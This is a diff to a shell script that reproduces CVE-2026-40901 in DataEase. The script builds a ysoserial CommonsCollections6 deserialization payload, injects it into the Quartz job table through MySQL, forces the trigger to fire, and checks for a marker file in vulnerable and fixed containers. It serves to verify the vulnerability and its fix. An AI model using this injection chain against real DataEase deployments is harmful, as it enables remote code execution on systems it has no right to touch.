@@ -1,0 +1,259 @@
+--- repro/reproduction_steps.sh
++++ repro/reproduction_steps.sh
+@@ -9,13 +9,61 @@
+
+ cd "$ROOT"
+
++export DOCKER_API_VERSION="${DOCKER_API_VERSION:-1.43}"
++
++SUDO=""
++if [ "$(id -u)" -ne 0 ] && command -v sudo >/dev/null 2>&1; then
++    SUDO="sudo"
++fi
++
++if ! command -v java >/dev/null 2>&1 || ! command -v javac >/dev/null 2>&1; then
++    echo "[+] Installing Java..."
++    $SUDO apt-get update -qq
++    $SUDO apt-get install -y -qq default-jdk-headless 2>&1 | tail -5
++fi
++
+ # Configuration
+ VULNERABLE_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.20"
+ FIXED_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.21"
+ MYSQL_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5"
+-YSOSERIAL_JAR="/tmp/ysoserial.jar"
+-PAYLOAD_BIN="/tmp/payload-cc6-repro.bin"
+-MARKER="/tmp/pruva-cve-2026-40901.txt"
++SHARED_TMP="${PRUVA_REPRO_CACHE_DIR:-$ROOT/.pruva-repro-cache}/REPRO-2026-00167"
++mkdir -p "$SHARED_TMP"
++if [ -n "${PRUVA_REPRO_CACHE_DIR:-}" ]; then
++    YSOSERIAL_CACHE="${PRUVA_REPRO_CACHE_DIR}/ysoserial-v0.0.6"
++    mkdir -p "$YSOSERIAL_CACHE"
++    YSOSERIAL_JAR="$YSOSERIAL_CACHE/ysoserial.jar"
++    echo "[+] Using ysoserial cache: $YSOSERIAL_CACHE"
++else
++    YSOSERIAL_JAR="$SHARED_TMP/ysoserial.jar"
++fi
++PAYLOAD_BIN="$SHARED_TMP/payload-cc6-repro.bin"
++MARKER="$SHARED_TMP/pruva-cve-2026-40901.txt"
++
++download_ysoserial() {
++    local tmp="${YSOSERIAL_JAR}.tmp"
++    local url="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
++    rm -f "$tmp"
++
++    for attempt in 1 2; do
++        if curl -fL --retry 10 --retry-all-errors --retry-delay 5 --retry-max-time 300 \
++            --connect-timeout 20 --max-time 180 "$url" -o "$tmp"; then
++            break
++        fi
++        rm -f "$tmp"
++        sleep 10
++    done
++
++    if [[ ! -s "$tmp" ]] && command -v gh >/dev/null 2>&1; then
++        gh release download v0.0.6 --repo frohoff/ysoserial \
++            --pattern ysoserial-all.jar --output "$tmp" >/dev/null 2>&1 || true
++    fi
++    if ! jar tf "$tmp" >/dev/null 2>&1; then
++        echo "[-] Downloaded ysoserial jar is invalid" >&2
++        rm -f "$tmp"
++        return 1
++    fi
++    mv "$tmp" "$YSOSERIAL_JAR"
++}
+
+ echo "============================================"
+ echo "CVE-2026-40901 Reproduction"
+@@ -24,9 +72,9 @@
+ echo ""
+
+ # Step 1: Ensure ysoserial is available
+-if [[ ! -f "$YSOSERIAL_JAR" ]]; then
++if [[ ! -f "$YSOSERIAL_JAR" ]] || ! jar tf "$YSOSERIAL_JAR" >/dev/null 2>&1; then
+     echo "[+] Downloading ysoserial..."
+-    curl -sL "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" -o "$YSOSERIAL_JAR"
++    download_ysoserial
+ fi
+
+ # Step 2: Generate ysoserial CommonsCollections6 payload
+@@ -48,10 +96,10 @@
+ python3 -c "
+ with open('$PAYLOAD_BIN','rb') as f:
+     data = f.read()
+-with open('/tmp/payload.hex','w') as fh:
++with open('$SHARED_TMP/payload.hex','w') as fh:
+     fh.write(data.hex())
+ "
+-HEX=$(cat /tmp/payload.hex)
++HEX=$(cat "$SHARED_TMP/payload.hex")
+
+ # Step 3: Compile deserialization harness (for classpath test)
+ echo "[+] Compiling deserialization harness..."
+@@ -68,7 +116,7 @@
+     }
+ }
+ JAVAEOF
+-javac "$ROOT/DeserializeTest.java" -d /tmp
++javac "$ROOT/DeserializeTest.java" -d "$SHARED_TMP"
+
+ # Step 4: Verify commons-collections 3.x presence/absence
+ echo ""
+@@ -158,29 +206,107 @@
+ done
+ 
+ echo "[+] Injecting payload into QRTZ_JOB_DETAILS..."
+-docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "
++inject_quartz_payload() {
++  docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "
+ UPDATE dataease.QRTZ_JOB_DETAILS SET JOB_DATA = 0x${HEX} WHERE SCHED_NAME = 'deSyncJob' AND JOB_NAME = 'Datasource' AND JOB_GROUP = 'check_status';
+ " 2>&1
++}
+ 
+-# Get next fire time
+-NEXT_FIRE=$(docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "SELECT NEXT_FIRE_TIME FROM dataease.QRTZ_TRIGGERS WHERE SCHED_NAME='deSyncJob' AND TRIGGER_NAME='Datasource';" 2>&1 | tail -n1)
+-WAIT_SECS=$(python3 -c "
+-import time
+-fire = int('$NEXT_FIRE')
+-wait = max(0, int((fire - int(time.time()*1000))/1000) + 15)
+-print(wait)
+-")
+-echo "[+] Next trigger fire in ~${WAIT_SECS}s. Waiting..."
+-sleep $WAIT_SECS
+-
+-echo "[+] Checking for marker file..."
+-if docker exec $DATAEASE_V test -f /tmp/pruva-cve-2026-40901.txt 2>/dev/null; then
+-  echo "    [VULNERABLE] MARKER FILE FOUND inside running DataEase container!"
+-  docker exec $DATAEASE_V cat /tmp/pruva-cve-2026-40901.txt > "$EVIDENCE/marker-vulnerable.txt" 2>/dev/null || true
+-  VULN_MARKER=1
+-else
++inject_quartz_payload
++
++force_quartz_fire() {
++  local forced_fire
++  forced_fire=$(python3 -c "import time; print(int(time.time()*1000) + 5000)")
++  docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "
++UPDATE dataease.QRTZ_TRIGGERS
++SET NEXT_FIRE_TIME = ${forced_fire}, TRIGGER_STATE = 'WAITING'
++WHERE SCHED_NAME='deSyncJob' AND TRIGGER_NAME='Datasource';
++" 2>&1
++}
++
++check_vuln_marker() {
++  if docker exec $DATAEASE_V test -f /tmp/pruva-cve-2026-40901.txt 2>/dev/null; then
++    echo "    [VULNERABLE] MARKER FILE FOUND inside running DataEase container!"
++    docker exec $DATAEASE_V cat /tmp/pruva-cve-2026-40901.txt > "$EVIDENCE/marker-vulnerable.txt" 2>/dev/null || true
++    VULN_MARKER=1
++    return 0
++  fi
++  return 1
++}
++
++dump_quartz_state() {
++  local label="$1"
++  docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "
++SELECT JOB_NAME, JOB_GROUP, LENGTH(JOB_DATA) AS JOB_DATA_BYTES
++FROM dataease.QRTZ_JOB_DETAILS
++WHERE SCHED_NAME = 'deSyncJob' AND JOB_NAME = 'Datasource' AND JOB_GROUP = 'check_status';
++SELECT TRIGGER_NAME, TRIGGER_STATE, NEXT_FIRE_TIME, PREV_FIRE_TIME
++FROM dataease.QRTZ_TRIGGERS
++WHERE SCHED_NAME='deSyncJob' AND TRIGGER_NAME='Datasource';
++" > "$EVIDENCE/quartz-state-${label}.log" 2>&1 || true
++}
++
++wait_for_vuln_marker() {
++  local attempts="$1"
++  local delay="$2"
++  for i in $(seq 1 "$attempts"); do
++    check_vuln_marker && return 0
++    sleep "$delay"
++  done
++  return 1
++}
++
++restart_dataease_with_payload() {
++  echo "[+] Re-injecting payload with DataEase stopped, then restarting Quartz..."
++  docker logs $DATAEASE_V --tail 300 > "$EVIDENCE/vulnerable-before-restart.log" 2>&1 || true
++  docker stop $DATAEASE_V >/dev/null
++  inject_quartz_payload >/dev/null
++  force_quartz_fire >/dev/null
++  dump_quartz_state "before-restart"
++  docker start $DATAEASE_V >/dev/null
++
++  echo "[+] Waiting up to 180s after restart for Quartz to deserialize payload..."
++  for i in $(seq 1 36); do
++    check_vuln_marker && return 0
++    STATUS=$(docker inspect $DATAEASE_V --format='{{.State.Status}}' 2>/dev/null || echo "gone")
++    if [ "$STATUS" = "exited" ]; then
++      echo "[-] DataEase exited during restart fallback"
++      docker logs $DATAEASE_V --tail 500 > "$EVIDENCE/vulnerable-restart-fail.log" 2>&1 || true
++      return 1
++    fi
++    sleep 5
++  done
++  return 1
++}
++
++# Force the Quartz trigger to fire promptly after payload injection instead of waiting
++# for the scheduler's next several-minute interval.
++force_quartz_fire
++dump_quartz_state "after-injection"
++
++echo "[+] Forced next trigger fire within ~5s. Waiting up to 90s..."
++VULN_MARKER=0
++wait_for_vuln_marker 18 5 || true
++
++if [[ "$VULN_MARKER" != "1" ]]; then
++  restart_dataease_with_payload || true
++fi
++
++if [[ "$VULN_MARKER" != "1" ]]; then
++  echo "[+] Restart fallback did not fire; retrying Quartz wakeups for up to 180s..."
++  for i in $(seq 1 36); do
++    if [ $(( (i - 1) % 6 )) -eq 0 ]; then
++      force_quartz_fire >/dev/null 2>&1 || true
++      dump_quartz_state "retry-${i}"
++    fi
++    check_vuln_marker && break
++    sleep 5
++  done
++fi
++
++if [[ "$VULN_MARKER" != "1" ]]; then
+   echo "    [VULNERABLE] Marker file NOT found"
+-  VULN_MARKER=0
++  dump_quartz_state "final"
+ fi
+ 
+ echo "[+] Checking logs for Quartz deserialization evidence..."
+@@ -203,8 +329,8 @@
+ echo "========== TESTING FIXED v2.10.21 (Container Classpath) =========="
+
+ rm -f "$MARKER"
+-FIXED_OUTPUT=$(docker run --rm -v /tmp:/tmp "$FIXED_IMAGE" sh -c \
+-    "cd /opt/apps && rm -rf /tmp/extract-fixed && unzip -q app.jar 'BOOT-INF/lib/*' -d /tmp/extract-fixed && java -cp '/tmp:/tmp/extract-fixed/BOOT-INF/lib/*' DeserializeTest /tmp/payload-cc6-repro.bin && ls -la /tmp/pruva-cve-2026-40901.txt" 2>&1)
++FIXED_OUTPUT=$(docker run --rm -v "$SHARED_TMP:/tmp" "$FIXED_IMAGE" sh -c \
++    "cd /opt/apps && rm -rf /tmp/extract-fixed && unzip -q app.jar 'BOOT-INF/lib/*' -d /tmp/extract-fixed && java -cp '/tmp:/tmp/extract-fixed/BOOT-INF/lib/*' DeserializeTest /tmp/payload-cc6-repro.bin && ls -la /tmp/pruva-cve-2026-40901.txt" 2>&1 || true)
+ 
+ echo "$FIXED_OUTPUT" > "$EVIDENCE/fixed-container-test.log"
+ 
+@@ -245,9 +371,6 @@
+ EOF
+ 
+ cat > "$EVIDENCE/validation_verdict.json" <<EOF
+-
+-# Also write to repro root as required deliverable
+-cp "$EVIDENCE/validation_verdict.json" "$ROOT/repro/validation_verdict.json"
+ {
+   "cve": "CVE-2026-40901",
+   "vulnerable_version": "v2.10.20",
+@@ -260,6 +383,9 @@
+ }
+ EOF
+ 
++# Also write to repro root as required deliverable
++cp "$EVIDENCE/validation_verdict.json" "$ROOT/repro/validation_verdict.json"
++
+ echo ""
+ echo "[+] Evidence written to $EVIDENCE"
+ cat "$EVIDENCE/validation_verdict.json"
